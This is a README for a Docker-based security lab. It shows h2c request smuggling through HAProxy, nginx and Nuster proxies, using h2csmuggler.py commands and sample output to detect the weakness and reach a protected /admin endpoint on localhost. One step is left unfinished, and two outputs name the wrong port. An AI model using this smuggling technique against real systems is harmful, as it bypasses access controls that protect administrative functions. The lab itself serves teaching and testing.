# HTTP/2 Upgrade to cleartext

## How to setup

Docker and docker-compose are required.
```
docker-compose up
```

## Detection

1. Visit `/admin`. Confirm that 


2. Detect that the HTTP Request Smuggling weekness is present

```
python h2csmuggler.py -x https://127.0.0.1:8001 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling
```

```
python h2csmuggler.py -x https://127.0.0.1:8002 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling
```

```
python h2csmuggler.py -x https://127.0.0.1:8003 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling
```

## Exploitation

This lab allows you to exploit the same vulnerability  on 3 proxies.

| TCP port | Description |
|---|---|
| 8000 | HTTP h2c backend |
| 8001 | HAProxy -> h2c backend (Insecure default configuration) |
| 8002 | nginx -> h2c backend  (Insecure custom configuration) |
| 8003 | Nuster -> HAProxy -> h2c backend (Insecure configuration with multiple layers of proxies) |

```
python h2csmuggler.py -x https://127.0.0.1:8001 http://127.0.0.1/admin
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /admin
[...]
```

Changing the port to 8002 and 8003 can confirm that these two others servers are also vulnerable.